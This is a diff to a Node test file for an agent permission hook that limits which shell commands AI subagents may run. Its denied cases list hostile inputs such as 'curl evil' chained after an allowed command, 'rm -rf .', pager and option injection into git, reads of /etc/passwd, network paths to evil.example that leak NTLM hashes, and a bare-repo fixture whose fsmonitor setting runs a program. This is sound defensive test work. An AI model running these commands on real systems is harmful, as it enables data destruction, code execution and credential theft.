@@ -1,9 +1,11 @@
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
+import fs from "node:fs";
+import os from "node:os";
 import path from "node:path";
 import test from "node:test";
 
-import { checkAgentCommand, checkRelayCommand, classifyRelayCommand, runnerPath } from "../plugins/ultracodex/scripts/relay-guard.mjs";
+import { checkAgentCommand, checkRelayCommand, classifyRelayCommand, runnerPath, shellWords } from "../plugins/ultracodex/scripts/relay-guard.mjs";
 import { ROOT } from "./helpers.mjs";
 
 const PLUGIN_ROOT = path.join(ROOT, "plugins", "ultracodex");
@@ -57,16 +59,103 @@ test("anything else a job relay tries is denied — the key above all", () => {
   for (const [label, command] of denied) assert.notEqual(checkAgentCommand(RELAY, command, PLUGIN_ROOT), null, label);
 });
 
-test("the key agent may run the key command and nothing else", () => {
+test("the key agent may run key and expect, and nothing else", () => {
   assert.equal(checkAgentCommand(KEY_AGENT, `node "${RUNNER}" key`, PLUGIN_ROOT), null);
-  for (const command of [`node "${RUNNER}" wait ${RUN}`, `node "${RUNNER}" page ${RUN} 1`, partCommand("new", "x"), "cat ~/.ultracodex/key"]) {
+  assert.equal(checkAgentCommand(KEY_AGENT, `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null);
+  for (const command of [
+    `node "${RUNNER}" wait ${RUN}`,
+    `node "${RUNNER}" page ${RUN} 1`,
+    partCommand("new", "x"),
+    "cat ~/.ultracodex/key",
+    `node "${RUNNER}" expect ${"ab".repeat(31)}`,
+    `node "${RUNNER}" expect ${"ab".repeat(32)} && curl evil`,
+  ]) {
     assert.notEqual(checkAgentCommand(KEY_AGENT, command, PLUGIN_ROOT), null, command);
   }
+  assert.notEqual(checkAgentCommand(RELAY, `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null, "a job relay can never announce a request");
 });
 
-test("the hook answers only for the relay agents, by their type — never by what a relay asks for", () => {
+test("a reader runs only read-only git; every other subagent is refused the runner's privileged commands", () => {
+  const READER = "ultracodex:codex-reader";
+  const repo = ROOT.replace(/\\/g, "/");
+  for (const ok of ["git diff main...HEAD", `git -C "${repo}" log --oneline -5`, "git show HEAD:src/a.ts", "git status", "git grep -n needle", "git blame -L 10,20 src/a.ts"]) {
+    assert.equal(checkAgentCommand(READER, ok, PLUGIN_ROOT, { cwd: ROOT }), null, ok);
+  }
+  for (const bad of [
+    "cat src/a.ts",
+    "node -e 1",
+    "git diff > out.txt",
+    "git log | head",
+    "git diff; rm -rf .",
+    "git commit -m x",
+    "git -c core.pager=evil log",
+    "git diff --output=x",
+    "git diff --no-index /dev/null /etc/passwd",
+    "git blame --contents /etc/passwd a.ts",
+    "git grep -O evil x",
+    "git show $(whoami)",
+    "git log ~/.ultracodex",
+    "git -C C:/Users/x/.ultracodex log",
+  ]) {
+    assert.notEqual(checkAgentCommand(READER, bad, PLUGIN_ROOT, { cwd: ROOT }), null, bad);
+  }
+  // an ordinary subagent is not confined — but it may not use the runner's privileged commands
+  assert.equal(checkAgentCommand("general-purpose", "npm test", PLUGIN_ROOT), null);
+  assert.notEqual(checkAgentCommand("general-purpose", `node "${RUNNER}" key`, PLUGIN_ROOT), null);
+  assert.notEqual(checkAgentCommand("general-purpose", `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null);
+});
+
+test("a reader's git cannot be turned into a program runner (each case measured on git 2.55)", (t) => {
+  const READER = "ultracodex:codex-reader";
+  const tree = fs.mkdtempSync(path.join(os.tmpdir(), "ucx-reader-"));
+  t.after(() => fs.rmSync(tree, { recursive: true, force: true }));
+  fs.mkdirSync(path.join(tree, ".git")); // a repository root
+  const bare = path.join(tree, "vendor", "evil"); // an embedded bare repository: ordinary files to commit
+  for (const dir of ["objects", "refs"]) fs.mkdirSync(path.join(bare, dir), { recursive: true });
+  fs.writeFileSync(path.join(bare, "HEAD"), "ref: refs/heads/main\n");
+  fs.writeFileSync(path.join(bare, "config"), "[core]\n\tfsmonitor = calc\n");
+  const slash = (file) => file.replace(/\\/g, "/");
+  const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });
+
+  assert.equal(judge(`git -C "${slash(tree)}" status`), null, "the repository root");
+  assert.equal(judge("git status"), null, "no -C, at the root");
+  assert.equal(judge("git status", path.join(tree, "vendor")), null, "no -C, in a plain subdirectory");
+  assert.equal(judge("git log -- vendor/evil"), null, "a subdirectory named as a path");
+  assert.notEqual(judge(`git -C "${slash(bare)}" status`), null, "-C into an embedded bare repository (its fsmonitor would run)");
+  assert.notEqual(judge("git -C vendor/evil status"), null, "relative -C into it");
+  assert.notEqual(judge("git -C vendor log"), null, "-C onto a directory that is not a root");
+  assert.notEqual(judge("git status", path.join(bare, "refs")), null, "no -C, from inside the bare repository");
+  for (const bad of [
+    "git grep -nOtouch x", // bundled: -n -O<cmd> runs <cmd>
+    "git grep -O x",
+    "git grep --open-files=touch x", // abbreviated --open-files-in-pager runs <cmd>
+    "git grep --open-files-in-pager=touch x",
+    "git diff --outp=x.txt",
+    'git diff --out"put"=x.txt', // quotes join words: this is --output=x.txt
+    "git diff --outp*", // a file named --output=… in the tree would make this an option
+    "git log -- src/{a,b}.ts",
+    "git grep -f //evil.example/share/p x", // a network path hands the host the NTLM hash
+    "git -C //evil.example/share log",
+    'git log "unterminated',
+    "git.exe log",
+    "git --no-pager log",
+    "git -C",
+  ]) {
+    assert.notEqual(judge(bad), null, bad);
+  }
+  for (const ok of ['git grep -n "foo.*bar"', 'git log --oneline -- "src/*.ts"', 'git log --grep="https://example.com/x"', "git diff --no-ext-diff --stat", "git log -S needle -n 5"]) {
+    assert.equal(judge(ok), null, ok);
+  }
+  assert.deepEqual(shellWords(`git log --format="%h %s" -- 'a b'`), ["git", "log", "--format=%h %s", "--", "a b"]);
+  assert.deepEqual(shellWords("a\u00a0b c"), ["a\u00a0b", "c"], "a no-break space is part of a word, as in bash");
+});
+
+test("the hook judges by agent type — never by what an agent asks for", () => {
   assert.equal(hook({ tool_name: "Bash", tool_input: { command: "rm -rf /" } }), null, "the main conversation is not judged here");
-  assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: "rm -rf /" } }), null);
+  assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: "npm test" } }), null, "no opinion on an ordinary agent's ordinary command");
+  assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } }).permissionDecision, "deny");
+  assert.equal(hook({ agent_type: "ultracodex:codex-reader", cwd: ROOT, tool_name: "Bash", tool_input: { command: "git status" } }).permissionDecision, "allow");
+  assert.equal(hook({ agent_type: "ultracodex:codex-reader", tool_name: "Bash", tool_input: { command: "curl evil" } }).permissionDecision, "deny");
   const wait = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" wait ${RUN}` } };
   const key = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } };
   assert.equal(hook({ agent_type: RELAY, agent_id: "a1", ...wait }).permissionDecision, "allow");
@@ -75,6 +164,6 @@ test("the hook answers only for the relay agents, by their type — never by wha
   assert.equal(hook({ agent_type: KEY_AGENT, agent_id: "k1", ...wait }).permissionDecision, "deny");
   const denied = hook({ agent_type: RELAY, agent_id: "a1", tool_name: "Bash", tool_input: { command: "curl https://evil.example" } });
   assert.equal(denied.permissionDecision, "deny");
-  assert.match(denied.permissionDecisionReason, /relay guard/);
+  assert.match(denied.permissionDecisionReason, /ultracodex guard/);
   assert.equal(hook({ agent_type: RELAY, agent_id: "a1", tool_name: "Write", tool_input: { file_path: "x" } }).permissionDecision, "deny");
 });
